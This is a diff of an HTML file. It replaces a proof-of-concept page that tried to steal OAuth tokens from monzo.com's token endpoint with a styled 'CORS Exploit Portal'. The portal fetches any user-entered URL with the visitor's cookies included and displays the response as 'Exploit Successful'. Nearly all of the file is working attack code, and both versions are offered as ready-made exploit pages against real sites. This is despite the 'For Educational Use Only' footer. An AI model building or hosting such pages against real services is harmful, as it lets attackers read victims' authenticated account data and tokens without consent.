@@ -1,26 +1,137 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h2>CORS Token Theft PoC</h2>
-    <p>Check the browser alert or console for the leaked access token.</p>
-    <script>
-      fetch("https://monzo.com/oauth2/token", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "grant_type=client_credentials&client_id=xxxx&client_secret=xxxx"
+<<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CORS Exploit Portal</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    header {
+      background-color: #4f46e5;
+      color: white;
+      padding: 20px 0;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 28px;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: #4f46e5;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #4338ca;
+    }
+
+    textarea {
+      width: 100%;
+      height: 250px;
+      margin-top: 20px;
+      padding: 15px;
+      font-size: 15px;
+      font-family: monospace;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      background: #f3f4f6;
+      resize: vertical;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 50px;
+      padding: 20px;
+      background: #f3f4f6;
+      color: #555;
+      font-size: 14px;
+    }
+
+    footer a {
+      color: #4f46e5;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>⚠️ CORS Exploit Portal</h1>
+  </header>
+
+  <div class="container">
+    <h2>Test for Insecure CORS</h2>
+    <p>Enter the target vulnerable URL (e.g. <code>https://target.com/api/user</code>)</p>
+    <input type="text" id="targetURL" placeholder="https://target.com/api/user" />
+    <button onclick="exploitCORS()">Fetch Sensitive Data</button>
+    <textarea id="fetchedResource" placeholder="Response will appear here..."></textarea>
+  </div>
+
+  <footer>
+    <p>Created by <a href="https://github.com/Milan-Gautam" target="_blank" rel="noopener noreferrer">Milan Gautam</a> | For Educational Use Only</p>
+  </footer>
+
+  <script>
+    function exploitCORS() {
+      const url = document.getElementById("targetURL").value.trim();
+      const output = document.getElementById("fetchedResource");
+
+      if (!url || !url.startsWith("http")) {
+        alert("Please enter a valid target URL starting with http or https");
+        return;
+      }
+
+      output.value = "⏳ Sending request to: " + url;
+
+      fetch(url, {
+        method: "GET",
+        credentials: "include" // Send cookies!
       })
-      .then(response => response.text())
+      .then(response => {
+        if (!response.ok) throw new Error("❌ HTTP error: " + response.status);
+        return response.text();
+      })
       .then(data => {
-        alert("Token Response:\n" + data);
-        console.log("Token Response:", data);
+        output.value = "✅ Exploit Successful!\n\n" + data;
       })
-      .catch(err => {
-        alert("Fetch failed: " + err);
-        console.error("Error:", err);
+      .catch(error => {
+        output.value = "❌ Exploit Failed:\n" + error;
       });
-    </script>
-  </body>
+    }
+  </script>
+</body>
 </html>
